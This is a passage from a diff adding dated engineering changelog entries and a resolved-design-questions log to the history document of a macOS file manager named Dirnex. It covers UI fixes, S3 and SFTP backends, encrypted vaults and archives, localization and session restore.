+`makeFirstResponder` on the parent, a sheet raised under an app-modal window, and sheet stacking,
+which on macOS 26 **no longer queues invisibly** (docs/NOTES.md corrected).
+
+**2026-08-19 — the download dialog's Download button, and the dialog on top of the card.** ⌃Q on a
+14,5 MB object raised the size confirmation, and pressing **Download** closed it and did nothing:
+`RemoteFetchPrompt.confirm` handed its completion `[weak self]` on an object nobody else retained —
+`fetch` builds it in a local, `beginSheetModal` returns at once, and the alert retains the *closure*
+— so the answer arrived at a deallocated prompt. Nothing logged, and the sibling path was fine for
+the reason that hid it: `start()` launches a `Task`, which captures `self` strongly, so the same
+click worked wherever no question was asked. The second half is what the fix made possible. A remote
+transfer had two reporters — the placeholder card that is already standing where the preview will
+be, naming the file and carrying a determinate bar and Stop, and `RemoteFetchPrompt`'s deferred
+*modal* sheet, which went up over it after 1200 ms and took the keyboard off the file list to say the
+same thing. The card now draws every preview download: an explicit fetch registers its counter and
+its cancel flag with `RemoteFileCache` (`beginExplicitFetch`) exactly as the cursor-following one
+does, `previewFetchState`/`previewFetchProgress` answer for either kind, Stop reaches either, and the
+sheet stands down wherever a card is on screen — ⌘Y with Quick View off, ⏎ and F4 keep it, since
+there the sheet is the only thing that can report anything. Two smaller pieces fell out: an explicit
+fetch needed an `onStart` hook, because a confirmed one begins when the user answers rather than when
+the caller returned, and the card was drawn before the question was asked; and `scheduleAutomaticFetch`
+now stands aside for a row an explicit fetch holds, or the redraw the Download button causes issues a
+second transfer of the same object (measured — the control fails at `copyCount == 2`). Pinned by
+seven tests driving a real `NSAlert` sheet on a real window, each fix's negative control failing in
+the reported shape: reverting the capture leaves `copyCount == 0` after a genuine click on the
+dialog's own default button. docs/NOTES.md ▸ AppKit, ▸ Design lessons.
+
+**2026-08-20 — the same fix, on the exit that actually happens.** The queue-bar half of the
+2026-08-19 fix worked; the Quick View card's half was inert, and the user re-reported the identical
+symptom on a preview download. Two things were wrong with it, and each is invisible on its own. The
+reset was keyed on `apply(_:)`'s non-downloading branch — which covers a transfer that stopped or
+failed, while the **ordinary** end of one hides the card outright (the bytes landed, so the surface
+shows the file) and applies no state at all. And the claim it was tested against was about the model
+rather than the screen: `startPolling` has always zeroed `doubleValue` in the same turn it unhides
+the bar, so the model reads 0 throughout while the fill *layer* still carries the last download's
+presentation. Sampling that layer at 10 ms in the running app against the real bucket, driving the
+user's own sequence: **0.96 at the reveal, empty 11 ms later**, with the model reading `0.00` at
+every sample. Emptying the bar in the stand-down funnel (`QuickViewPlaceholderCard.standDown`) plus
+the state branch covers both exits; re-measured live it opens at 0.02. The test now takes the exit as
+its argument, because a single-exit test passes against the half-fix — reverted to it, the `.stopped`
+case is green and the show-a-file case fails at 1.0. docs/NOTES.md ▸ AppKit.
+
+**2026-08-19 — a progress bar no longer opens on the last run's fill.** Both places a bar is hidden
+between runs kept the value they were last drawn with, so the *next* run revealed the previous one's
+fill before its own first number arrived: the queue bar (the window controller's idle branch hid it
+without drawing anything) and Quick View's placeholder card (its bar is hidden except while
+downloading). Reported by a user as a bar that "starts at 100 %, drops to zero, and only then runs",
+on a copy and on ⌃Q alike. The obvious cause is the wrong one and the queue's own doc comment
+predicts it — the aggregate rolls up finished jobs, and `clearFinished` is dispatched in a `Task` —
+but instrumenting `update(with:)` in the running app showed every fraction correct, the new batch's
+first included, with the only wrong number the one already on the bar. So the fix is to reset when
+the work *ends*, while the bar is off screen: an idle snapshot now goes through `update(with:)` like
+any other and empties it (`QueueBarView.reset`), which also clears the coalescer's memo — otherwise a
+copy started within a second of the last one opens on the previous batch's byte count and holds it.
+Measured before and after by sampling the indicator's **presentation** layer at 4 ms inside the app
+(its model snaps, so a `cacheDisplay` bitmap would have cleared the code): the second copy read
+`1.00` at the first sample and now reads empty from the first. Four tests, with each half reverted as
+its own negative control — the queue bar's reproduces the report verbatim, `progressFraction → 1.0`
+over a stale `"400 bytes of 400 bytes"` — and the three coalescing tests green throughout as the
+narrowness control. `QueueBarView` crossed the 500-line ceiling doing it, so the readout and its
+coalescing rule moved into `QueueBarView+Detail` beside the wording split that was already there.
+docs/NOTES.md ▸ AppKit.
+
+**2026-08-19 — a bucket row expands in a tree.** Tree mode stopped being local-only on 08-17, which
+gave every bucket row in an S3 account pane a disclosure triangle — opening into nothing.
+`S3AccountBackend` answers for its root and nothing deeper by design (everything below a bucket is
+the `S3Backend` that shipped five slices earlier), so the tree's lazy load threw `notFound` into its
+own `try?`: expanded, childless, silent, with nothing logged and both suites green. Reported from a
+screenshot the day M21 closed. A bucket's contents are a **connect**, not a listing, so `→` now goes
+through the funnel Enter uses — `connectS3` split into `establishS3Connection` (probe, self-correct,
+register) and the navigation that had been welded to it, so the region-301 correction and the
+path-style retry reach an expansion for exactly the reasons they reach Enter, rather than in a second
+spelling. The rows it installs keep their own `s3://` paths, which is what makes everything below
+them free: `TreeProjection` recurses into each entry's *own* path and never assumes a row descends
+from the tree's root, so deeper expansion, F5, ⌃Q and F8 route to the backend that owns the bytes
+with no new code, and the core needed no change at all. Two things the crossing changed underneath —
+`←` climbed by `entry.path.parent`, which is no answer where the child is on another backend, so it
+now walks the rows by depth; and a failed expansion names the row on the status line rather than
+raising an alert on a key that comes in runs, leaving the sentence to Enter, which is the gesture
+that asked for that bucket outright. What it deliberately does not buy is expansion surviving a
+relaunch: a persisted expansion is anchored under the tab's root and a restored account pane has no
+live connection to list its own root with. Verified live against the real AWS account through the
+app's own controller, with the reverted version failing that same test in the reported shape —
+expanded set holding the bucket, listings holding only the root. docs/NOTES.md ▸ Design lessons.
+
+**2026-08-11 — a vault can be shown in Finder, per vault.** Dirnex attaches `-nobrowse`, so an
+unlocked vault is invisible to the rest of the Mac — right as a default, and wrong as a rule for
+everyone's every vault: a vault of scanned documents is one you unlock here and then want to attach
+to an email. So it is a checked item on the vault's own row (`VaultLocation.showsInFinder`), off
+unless someone turned it on, rather than one switch in Settings forcing one answer onto every vault.
+Toggling it on an *open* vault applies immediately — `mount -u -o browse` was measured to work
+unprivileged on a mounted encrypted sparsebundle — so it needs no lock-and-unlock round trip; a
+read-only volume refuses that remount cleanly (exit 66, flags untouched) and is told it will apply
+next unlock, which is true either way since the stored setting is what the next attach reads. Three
+findings changed the code, all in docs/NOTES.md ▸ Encryption: a bare `-o browse` **drops
+`MNT_IGNORE_OWNERSHIP`**, so the whole flags word is re-stated from `statfs` and only the browse bit
+changes; a browsable vault is enumerated by `mountedVolumeURLs` like any other mount, so it appeared
+under **Volumes as well as Vaults** — an invariant `-nobrowse` used to hold for free, now a rule with
+a test; and a new field on a persisted `Codable` value needed a hand-written `init(from:)`, because
+the synthesized decoder throws on a missing key and would have emptied every existing user's Vaults
+section behind a `try?`. Verified live end to end, both directions, with the mount flags as the
+judge rather than a screenshot.
+
+**2026-08-10 — a vault can be renamed.** The sidebar's vault row grew a Rename… item, and F2 on a
+selected vault row does the same thing. It renames the **volume**, not the row: `volumeName` is
+re-derived from the mount point on every unlock, so a Favorites-style nickname would be silently
+reverted the next time the vault opened, and until then the sidebar would disagree with the pane's
+own path bar. The image file is deliberately left alone — `VaultLocation.volumeName`'s doc comment
+already notes it is the one thing a user may have made unrevealing on purpose. `diskutil rename`
+needs the volume mounted, so a locked vault unlocks first through the existing funnel (silent when
+the passphrase is in the Keychain), which is why `openVault` was split into `withUnlockedVault` plus
+a navigation the rename does not want. Everything measured before it was written, and two findings
+changed the code: a name already in use still renames and **remounts at `/Volumes/<name> 1`**, so the
+mount point is re-read rather than rebuilt from what was typed, and the name limit is 255 UTF-8
+**bytes** — 127 Cyrillic characters — so the check counts bytes and the refusal sentence never names
+the number. Verified against real encrypted sparsebundles end to end (including the collision), and
+the F2 routing is pinned by selector string with a negative control, since a drifted `@objc`
+signature is exactly how that key would go quietly dead. docs/NOTES.md ▸ Encryption.
+
+**2026-08-10 — a vault now survives having its image file moved.** The other half of the same
+addressing problem, found while verifying the rename: a saved vault is keyed on its image's path in
+*two* stores — the sidebar list and the Keychain account — so an ordinary F2 on the `.sparsebundle`
+(or an F6, or a move of any folder above it) left the row pointing at nothing and the passphrase
+orphaned, with the row looking completely normal until it was clicked. The hook is `UndoRecord`, the
+one funnel every rename, move, multi-rename and sync already reports through; reading **both** ends
+of each step and letting the disk decide is what makes undo, redo and a half-applied revert all come
+out right with no direction bookkeeping. A trashed vault is deliberately *not* followed — leaving the
+path alone is what lets Put Back repair the row. The trap underneath took the measurement: `hdiutil`
+reports an image by the path it had when it was attached, forever, and carries no other identifier —
+so following a move would have made an unlocked vault read as locked with Lock unreachable.
+`MovedVaultImages` corrects that one answer where it is produced, honored only while the reported
+path is missing from disk, which is why it needs no expiry. Verified live across a locked rename, an
+unlocked rename and a ⌘Z: the row kept working, the Keychain item moved each time with no orphan left
+at any of the three paths, and the alias stopped applying by itself once the old path existed again.
+
+**2026-08-10 — Enter on a vault's image opens the vault.** A `.sparsebundle` *is* a directory, so
+the pane's generic directory branch walked into it: an unlocked vault, its sidebar row showing an
+open padlock and an eject button, read as **locked** from the pane — `bands/`, `Info.plist`, `lock`,
+`token` — and the only way to the files was the sidebar (user-reported). `openCurrentEntry` now
+checks for a **saved** vault ahead of that branch and hands it to the window's existing unlock
+funnel, so the sidebar click, the Unlock command and Enter are one gesture. Deliberately narrower
+than the command's `vaultImageUnderCursor`, which takes any image because the user named it: Enter
+is pressed on everything, and attaching a stranger's `.dmg` would ask for a passphrase and file it
+in the sidebar's Vaults section, none of which anyone requested. The suffix test that both now share
+moved into `DiskImageArguments.Kind.isImageName`, and the store read sits behind it since Enter is
+overwhelmingly pressed on ordinary folders. The decision half takes the `SavedVaults` as a
+parameter, so its tests never write a fake vault into the user's own sidebar. Verified live in both
+directions — unlocked jumped straight to `/Volumes/SecDocs`, and after locking, Enter unlocked
+silently from the Keychain and landed in the same place.
+
+**2026-08-09 — 26 strings that were wrapped but never translated.** The whole of Settings ▸ Panels as
+M15 built it — the row-height and size-visualization pickers with their footers, the three color
+wells, the file-type color rules editor — plus M18's "not drawn in this preview" and M14's
+multi-selection failure detail. All correctly `String(localized:)`-wrapped and all absent from
+`Localizable.xcstrings`, which compiles such a key **to itself**: the strings rendered in English
+inside a fully translated build, with both suites green and a perfect English screenshot. M12's own
+audit had already named the class in docs/NOTES.md and prescribed the cross-check that finds it —
+diff the compiler's `.stringsdata` against the catalog — and nobody had run it, which is the actual
+lesson: a check that lives in prose is not a check. It is now
+`scripts/check_localization_keys.py`, run in CI immediately after the app build, with the two keys
+that are legitimately absent named in its allow-list. The `allCases` pickers get a test as well
+(`LocalizationEnglishKeyCoverageTests`), since the sweep only fires once a key exists and a new enum
+case arrives with its catalog entry in the same commit. All 26 are translated into the 13 shipped
+languages and verified in the compiled bundle; the two segmented controls — the shape docs/NOTES.md
+records collapsing under a longer translation — were checked in a live Russian build rather than
+argued about, and the color-rule footer's `` `*.jpg;*.png` `` keeps its backticks so the wildcards
+survive SwiftUI's Markdown parser in every language.
+
+**2026-08-08 — the tree draws indent guides.** VS Code's vertical lines, one per ancestor level,
+always drawn faintly, with the ancestor line of the *focused* row drawn stronger — the focus being the
+pointer while it is over the pane and the **cursor** otherwise. That last part is the whole design
+difference: VS Code renders its guides `onHover` because a tree there is a mouse surface, and a
+keyboard-first pane where the guides only appear under the pointer would show them to nobody. Which
+line is active is the core's (`TreeProjection.activeGuide`, 13 tests): an open folder highlights the
+run its own children stand beside, anything else the run of the folder it is *in*. Two measurements
+decided the rest. The pane's `intercellSpacing` is **(17, 0)** — zero vertically — so a name cell's
+frame is the full row height and consecutive cells tile with no gap, which is what lets each row draw
+its own segment and have them join into one line with nothing coordinated between rows; no row-view
+drawing, no overlay. And the colors came from a contrast table over the pane's own two row stripes
+rather than from taste: the obvious pairing (`.separatorColor` at rest, `.tertiaryLabelColor` active)
+puts the *active* line at 1.88–2.26:1, which is where VS Code's **inactive** guide sits — so both moved
+up one, to `.tertiaryLabelColor` and `.secondaryLabelColor`. A 1 pt hairline is below what a
+computer-use screenshot resolves, so the geometry and the active/inactive step are pinned by a bitmap
+probe in the app suite (`TreeIndentGuideRenderingTests`) instead of by looking.
+
+**2026-08-07 — the Git status gutter became a badge.** M6's "status column (M/A/?/ignored)" was a
+contextual 20 pt column installed beside Name for the length of a stay in a repository; it is now
+`GitBadgeView`, at the trailing edge of the name cell outside the tag dots and the cloud badge —
+the order is dots, cloud, Git. Same information (Git's own letter, in the same colors), and the
+letters still line up in a vertical run, because the badge is right-aligned inside a fixed-width
+column and centered in a slot sized to the widest code. What it gives back is **37 pt of Name** — the
+column's 20 plus the 17 pt intercell spacing `NSTableView` charges per column — to put a letter about
+20 pt from where it lands now. That is the third time a "column" in the plan turned out to mean a
+badge in the name cell: tags and sync status made the same move at M6. Two things came with it: a
+per-status **tooltip** (the gutter could only name itself in its header, and `!` or `U` is nobody's
+vocabulary), and the fix for a latent `..` bug the third badge made worth looking for — the parent
+row's cell comes out of the same reuse pool as the real name cells and was clearing none of them.
+The one thing left alone deliberately: `GitStatusStyle`'s **colors** are unchanged, so `.systemGreen`
+still sits near 2.22:1 on a light background (docs/NOTES.md's palette table). That is a pre-existing
+call about the whole `.system*` palette, not this change's to make quietly.
+
+The item two separate milestones had asked for —
+**edit-temp-watch-repack write-back**, M11 for archives and SFTP, M13 for FTP — **landed for archives
+on 2026-08-09 and for all three remote backends with M21 Slice 10**, which generalized it rather
+than building it per protocol: `editRoute(for:)` answers `.remoteFile` for anything
+`isRemoteConnection && acceptsUploads` (`isSFTP || isFTP || isS3`), `EditedFileRegistry` watches the
+temp copy whatever it came from, and `uploadEditedFile` falls back to a plain `backend.copyFile`
+wherever there is no conditional writer — so S3 gets its `If-Match` and the other two get an
+ordinary upload, through one path. This paragraph claimed it was "still open for the two remote
+backends" until **2026-08-22**, when running it against a real server for the first time showed it
+had been shipped and broken for the whole of that time (above).
+
+M19's own loose end — **a per-archive passphrase held for the session** — **closed on 2026-08-09**,
+reported by a user who could not open a file inside an archive they had just packed. Preview, opening
+a member, and nested-archive entry all failed with `passphraseRequired`, and each swallowed it, so
+the keys read as broken rather than locked. `ArchivePassphraseStore` (one per window, memory only)
+now holds what the user typed and `withArchivePassphrase` is the single ask-once-retry-on-typo funnel
+all four gestures share, F5 included — so an archive unlocked by any of them is not asked about again.
+The *passive* half is the part with a rule behind it: a preview follows the cursor, so those paths
+read the store and stay quiet when it is empty, and only the gesture the user actually made may raise
+a sheet. Two things the same pass settled: Enter on a plain file member had never opened anything in
+*any* archive (it extracts to temp and launches the default app now, read-only, since nothing writes
+an edit back), and an encrypted archive's whole-archive extraction is reused for its later members
+rather than re-decrypted per arrow key.
+
+**The member filter — M19's last loose end — landed 2026-08-25**, and with it the reuse above went
+away rather than being improved. `EncryptedArchiveReader.extract` now takes an `ArchiveMemberFilter`
+and steps over every entry nobody asked for; a probe against a real 600 MB AES-256 archive settled the
+design before any Swift, and it settled two things at once. Skipping an AES entry on a seekable zip is
+a **seek** — 1.48 s to read the archive's data against **0.001 s** to reach a 6-byte member past three
+100 MB ones, byte-identical either way, and the same holds for a stream-written zip and a `.tar.gz` —
+so the whole feature is worth having; and `archive_read_next_header` *already* skips at exactly the
+same cost, so the explicit `archive_read_data_skip` is legibility rather than speed, which is the
+opposite of what this entry was going to claim before the control was run. The matching rule is
+`bsdtar`'s, because a user cannot see which engine ran: a directory member takes its subtree, matched
+on whole components. A wrapped (hidden-names) archive is the case the filter could most easily get
+wrong — its one outer entry is `Contents.tar` and the member asked for is inside it — so the wrap is
+recognized from the headers and the filter is handed to the inner extraction.
+
+Two things it **deleted**. `ArchivePreviewCache` had kept a second cache holding where each encrypted
+archive's whole-archive extraction landed, so sibling members were free once anyone had paid for the
+first; that existed only to amortize the cost the filter removes, and `ArchiveExtractor.Extraction
+.isWholeArchive` existed only to feed it. Its test had to be *inverted* rather than dropped — the
+observable was a shared temp directory, and the property it was really protecting (arrowing through a
+large encrypted archive must not re-decrypt it per keystroke) is unchanged and now bought by not
+decrypting at all. Verified in the running app: F5 on the 6-byte member of a 600 MB encrypted archive
+left the temp extraction root holding **one file and 4 KB**.
+
+The same day, **editing a member in place** landed on top of it, and needed one thing nobody had
+noticed was missing: every archive *write* went through `bsdtar`, which cannot be given a
+passphrase — so F8 delete and F5/paste add inside an encrypted archive had never worked. They failed
+safely (the rewrite throws before the original is touched), which is why it read as unimplemented
+rather than broken. `ArchiveRewriteFormat` now picks the libarchive route off one header read and
+re-states what the extracted tree cannot say — that the archive was encrypted, and whether its names
+were hidden. On top of that, an opened member is watched (`ArchiveMemberEditRegistry`) and a save
+offers to repack it; the read-only `chmod` that stood in for this for one day is gone, and F4 works
+inside a writable archive. A **nested** archive stays read-only, since its bytes are themselves a
+temp copy. (Its other loose end, PLAN.md §6's derived-data clause,
+closed on 08-09 too — measuring the three leaks it named found none of them real and found a fourth
+that was ours, so it was fixed rather than documented: §M19 ▸ Follow-up above.)
+
+**Session restore and workspaces keeping remote tabs — the next gap on
+[LOCATION-SUPPORT.md](LOCATION-SUPPORT.md)'s ranked list — landed 2026-08-27.** Quit with four bucket
+tabs open and they came back as one Home tab; so did a browsed `.zip`. The place had always been
+written down (a `PersistedTab` carries the account's whole descriptor); what was missing was the way
+*back* to it, since a `VFSBackendID` is host, user, port and region and says nothing about the auth
+method or an FTPS certificate somebody trusted. So the fix is a field rather than a mechanism:
+`PersistedTab` and `WorkspaceTab` carry the ``ServerEndpoint``, which holds no secret — the argument
+``ServerConnection`` already makes for its own JSON — and is deliberately independent of the sidebar,
+so a server connected once from the Connect sheet restores as readily as a named one and deleting a
+saved row does not close anybody's tabs.
+
+Three measurements shaped it rather than confirming it. **Registering a connection costs no round
+trip** — `connectSFTP`/`connectFTP`/`connectS3` build a transport and file it under a descriptor,
+and the network is in the listing that follows — so the reconnect is synchronous, needs none of the
+connect flow's corrections (a restored bucket's path is already the one an earlier connect settled
+on), and separates its two failures: no secret to register with, versus a server that will not
+answer. **The seam is `navigate`, not `activateTab`**, so switching to a tab, clicking a crumb, ⌘L
+and back/forward are one definition of "open this place again" — which is also what gives a tab that
+came back disconnected a way out with no new UI. And the launch activation is marked **unasked**,
+deciding two things and only for it: whether a server may be contacted at all, since Settings ▸
+Panels promises in so many words that a floor of 0 means *never contact a server unasked* and a
+relaunch is unasked however true it is that the tab was left open; and whether a failed listing is
+worth an alert, which by the "who is waiting?" rule it is not — the pane says it on the status line
+instead, measured at **273 pt English / 301.5 pt French** worst case against a 542 pt pane.
+
+`TabRestorePolicy` is the pure half: what each tab *needs* first — a directory, an archive **file**
+(never the tab's own path, which for a tab three folders into a zip exists nowhere), or a connection
+— with the app supplying only whether the disk agrees. It refuses a remote path whose stored endpoint
+is not that path's backend, since the two are separate fields of hand-editable JSON and the failure
+would be a plausible listing under the wrong name. A tab inside a **nested** archive is refused on the
+way *down*, where the fact is still known: its file is a temp extraction and the registry that knows
+so is session-scoped. `StoredServerEndpoint` degrades an unreadable endpoint to `nil` rather than
+throwing, because a pane's tabs are one JSON array and a throw would empty the pane rather than drop
+a tab — the trap `PersistedTab.viewMode` avoided with a raw string, on a value that cannot be one.
+
+Verified against a throwaway local `sshd` and a real `.zip`, with the **server's own log** as the
+independent judge. At the default floor the restored SFTP tab reconnected at launch and came back with
+its cursor on a file that exists only on the server, while the archive tab's came back on one that
+exists only inside the zip — a cursor `persistState` can only write if the listing actually landed. At
+floor 0 the same launch left that log **0 bytes**, and one scripted Go Up put an `Accepted publickey`
+in it: the promise and its escape hatch, measured on one running app. `CompositeBackend` gained an
+endpoint memory and, with it, a split — `CompositeBackend+Connect.swift` now owns *a connection
+existing* while the original owns which backend a path belongs to, by concept rather than by the
+twelve lines that were left under the file ceiling.
+
+---
+
+### The questions the plan asked, and how each closed
+
+[PLAN.md](../PLAN.md) §7 carried every open design question and its resolution as it was taken.
+All of them are closed — M25's was the last, on 2026-08-29 — so the log moved here on 2026-09-01
+and the plan keeps only the one-line answer. Newest first, the order the plan held them in.
+
+Opened with M25 (2026-08-27) and **closed by the user (2026-08-29)**:
+
+- **Whether Dirnex should invent a Trash the protocol does not have** — resolved: **no.** A remote
+  delete stays permanent, the confirmation is what stands in for the Trash, and the alert says in as
+  many words that there is nothing to undo. The alternative was a managed `.dirnex-trash/` prefix, a
+  rename into it, and a sidecar naming the origin the way a trash folder's `.DS_Store` carries its
+  `ptbL`/`ptbN` pair — the one safety net remote browsing has never had, at three prices.
+  **The one that decided it is that the price is not uniform**: a rename is one cheap verb over SFTP
+  and FTP and is **N copies plus N deletes** on S3, so a delete on a bucket would stop being N
+  deletes and become a billed movement of every byte under the prefix. Offering it only where it is
+  cheap is the worse half of that fork rather than the escape from it — a Trash that exists on some
+  backends and not others is a promise the user cannot carry from one pane to the next, and the pane
+  looks identical either way. The other two prices stand and are why this was a question rather than
+  a slice: it is a **format** other software meets — a stranger's FTP client, or the account's owner
+  on the web console, sees a folder of renamed junk and no explanation, so the layout outlives our
+  code the way M19's cipher choice does — and the sidecar is a second source of truth that can drift
+  from the files beside it, which the `.DS_Store` origin records survive only because Finder writes
+  them too.
+  - What the answer costs is **nothing to build**, which is what makes it the honest answer rather
+    than merely the cheap one: `deleteStrategy` already degrades to `.permanent` wherever `.trash`
+    is absent, so F8 on a server already raises `confirmPermanentDelete`'s critical alert reading
+    *Delete “x” permanently?* over *This can’t be undone.*, and `runDelete` already journals
+    nothing on that branch. The decision is to keep saying the true thing rather than to build a
+    safety net that is true on two backends of three.
+  - **Reopening is not symmetric with having taken it**, which is the reason to write it down:
+    staying permanent stays reopenable, while the format, once anyone's files are sitting in it,
+    cannot be withdrawn from accounts Dirnex does not own. docs/LOCATION-SUPPORT.md therefore
+    carries this as a **limit** rather than a gap — the `F8 → Trash` row is `n/a` in every remote
+    column, and footnote `p` names the decision.
+
+M19's two were taken at open and M18's one likewise (both below); M15's two
+closed with it, and M17's one closed at open and was then
+**re-taken twice** (2026-08-06, every time by the user):
+
+- **How much of a syntax theme the user owns** — resolved in favor of **a small fixed set of
+  semantic kinds, no Settings surface at all**. That half never moved. What moved, twice, is where
+  the colors come from. The question closed on *system dynamic colors*, on the ground that each
+  resolves per appearance for free — and Slice 3 measured them and found `.systemGreen` at
+  **2.22:1** on a white text background, with teal, cyan, mint, orange and yellow all between 1.5
+  and 2.4. The system palette is tuned for fills, not for text on white, so the premise held in
+  dark mode and collapsed in light. Re-taken as authored light values with the system color in
+  dark; then re-taken again, the same day and on sight of the result, as **VS Code's Dark Modern
+  and Light Modern on both halves** — the `dark_plus` / `light_plus` token colors. The reason is
+  not aesthetic preference but *whose* theme: a preview is read next to the editor the file will be
+  opened in, and matching that editor is worth more than any hue chosen in isolation. It cost
+  nothing to check — every published value clears the same ≥ 4.5:1 floor `SyntaxThemeTests` already
+  pinned, in both appearances, because `.textBackgroundColor` resolves to exactly `#1E1E1E` in
+  dark, which *is* VS Code's editor background. Everything the original answer was *for* survives
+  both moves: one `NSColor` per kind, resolving itself, no picker, no persistence. Reopening the
+  *owned-theme* half still means the M15 palette machinery (persistence, a Settings section, a
+  derived-foreground rule), which is why it stays written down.
+- Kind count is the one detail the answer no longer pins: it opened at "six and no more" and is
+  **eight**, `.inserted` and `.deleted` having been added with the diff scanner (HISTORY.md §M17
+  ▸ Slice 2). That is two more entries in the same dictionary, not a Settings surface.
+
+Opened with M18 (2026-08-06) and **closed at open, by the user**:
+
+- **Where mermaid diagrams come from** — resolved in favor of **a hand-rolled SVG renderer in the
+  core, over a named subset (flowchart and sequence)**, against the alternative of vendoring
+  `mermaid.min.js` and running it in the preview. The fork is real because the two answers cost
+  opposite things: bundling buys every diagram type mermaid supports, at ~3 MB of third-party
+  JavaScript, a JS engine running on every cursor step, and output §2 cannot test — which is
+  Highlightr's and tree-sitter's rejection at M17 arriving in a different shape. Hand-rolling buys a
+  pure, tested renderer with no dependency and no script in the page at all, at the price of a
+  subset that will visibly diverge from what the user's editor draws. The security half turned out
+  *not* to be the deciding argument in either direction: escaping the file's raw HTML (M18, above)
+  already means no script from the `.md` reaches the page, so a bundled mermaid would have been
+  running our code over the file's data rather than the file's code — a materially different posture
+  from M16's toggle, and one that would have needed saying out loud in the JavaScript policy.
+  Reopening it means taking on a vendored asset with its own update cadence, which is why the
+  reasoning stays written down.
+
+Opened with M19 (2026-08-09) and **closed at open, by the user** — both are format commitments that
+outlive the code, which is why they are written down rather than left in the implementation:
+
+- **Which cipher an encrypted archive uses** — resolved: **AES-256 and nothing else.** `zipcrypt` is
+  the only choice every Windows and macOS unzip can read and it has a published known-plaintext
+  break, so offering it under a checkbox saying "Encrypt" would be the app lying; AES-128 is sound
+  and buys nothing on hardware AES. The price is paid by the recipient rather than by us and is
+  therefore stated in the sheet: nothing Apple ships opens an AES-256 zip (measured — `unzip`,
+  `ditto` and Archive Utility all refuse it), so Keka, 7-Zip or WinRAR is required at the other end.
+  Reopening it means deciding that reach is worth a broken cipher, which is the whole argument in
+  one sentence.
+- **What a vault is made of** — resolved: an encrypted APFS **sparsebundle**. It is growable, so the
+  user is never asked to predict how much they will ever store (23 MB for a declared 10 GB), and
+  unlocked it is an ordinary mounted volume `LocalBackend` already browses, so the milestone added
+  no backend. What it costs is that a vault is a *directory* and therefore awkward to send — which
+  is the archive half's job, and the reason the milestone has two halves.
+
+All four opened before M1 are closed — the first three by shipping and living in the result,
+which was the stated way to decide them. Recorded because reopening one is a real design
+change, not a free choice:
+
+- **Space key** — TC's select+dir-size won over macOS's Quick Look. ⌘Y and a palette action
+  carry Quick Look. Validated by use across M1–M8.
+- **Quick view panel shortcut** — ⌃Q. ⌘Q is untouchable and ⌘⇧Q was free but less TC-like.
+- **Tabs UI** — compact TC-style, auto-hiding at a single tab.
+- **Name/brand check for "Dirnex"** — resolved 2026-07-19: the name is free, cleared by the
+  user, no conflicting prior marks. The `NOTICE` / `TRADEMARKS.md` carve-out stands as written.
+
+Opened and closed during M8:
+
+- **Seeding an existing favorites** — resolved 2026-07-20: **standard places lead, existing pins
+  follow.** The sidebar therefore looks unchanged on the launch after the merge, which matters more
+  than the one thing it costs: a path pinned under a custom label ("Dl" for Downloads) is reclaimed
+  as the standard row and loses that label. The alternatives were pins-first (nothing the user chose
+  moves, but the sidebar's top rows change on update) and seeding fresh installs only (honest about
+  ownership, but Home/Desktop/Documents visibly vanish on update). Still needs a one-shot "seeded"
+  flag in `FavoritesStore`, so it is a real migration and not a first-run branch.
+
+Opened and closed during M10:
+
+- **Google OAuth scope for a Drive API backend** — resolved 2026-07-22 by **not needing one.** The
+  fork was `drive`/`drive.readonly` (restricted: browse the *whole* Drive, but Google requires
+  restricted-scope verification **plus a paid annual CASA third-party security assessment** before a
+  distributed build may use it) versus `drive.file` (unrestricted, no assessment, but limited to files
+  the app itself created or the user explicitly picked — which cannot list a pre-existing Drive and so
+  is useless for a file manager). Dropping the API backend drops the question with it: the Desktop
+  mount browses through `LocalBackend` with no OAuth, no scope and no assessment. Reopening it means
+  taking on the whole verification commitment, which is why it stays written down.
+
+Opened during M13 planning (2026-07-25) and **closed** in it (both by the user, 2026-07-25; the
+security posture revisited and re-confirmed 2026-07-26):
+
+- **How much of FTP's insecurity is Dirnex's to editorialize about?** — resolved: **default the
+  connect form to FTPS and make plain FTP the deliberate switch**, with no per-connect nagging. It
+  costs nothing when the server supports FTPS and states the tradeoff exactly once, where it is
+  actionable; the failure mode to avoid — a warning firing on every connect to a decade-old NAS — is
+  avoided. The corollary was settled 2026-07-26: **no opportunistic "TLS optional" client mode.** The
+  three explicit modes reach every server, and `--ssl`'s silent fall-back to cleartext is a
+  password-downgrade vector, so `FTPProcessArguments` requires the upgrade (`--ssl-reqd`). A mismatch
+  is surfaced as a clear, actionable error (`tlsNotAvailable` / `tlsRequired`), never guessed around.
+- **Whether `curl`'s progress output is good enough for the queue, or transfers need chunking.** —
+  resolved: **one exact byte count per file**, via `-w '%{size_download}'` / `'%{size_upload}'`, which
+  matches what `SFTPProcessTransport` ships and hands the queue its delta directly. `curl`'s live meter
+  was measured at ~1 Hz rounded to `k`/`M` — good for a bar, not for accounting — so an intra-file
+  determinate bar is deferred as a thing worth doing for both remote backends together or not at all.
+
+Opened with M15 (2026-08-02) and **closed** in it the same day, as recommended — both about what a
+*marked set spanning directories* means for an operation:
+
+- **What F5/F6 do with marks spanning levels** — resolved: **TC's branch-view behavior**, flatten
+  *preserving relative paths* under the destination. Copying everything flat into one folder is the
+  alternative and it silently collides the moment two folders hold an `x.jpg`.
+- **F8 with an ancestor and its descendant both marked** — resolved: **dedupe to the ancestor**
+  before enqueuing, since deleting the parent already takes the child. Implementing it added the half
+  the settling did not say: **the dedupe belongs to F5/F6 too** — a copy fails *politely* there, with
+  a conflict prompt over a file the user never chose to duplicate, which is quieter and no less wrong.
+
+Both live in `TreeSelection` (core, 18 tests); the app keeps one `recursiveTargets()` for the
+operations that recurse and the raw `selectionTargets()` for the ones that don't. See §M15 above.
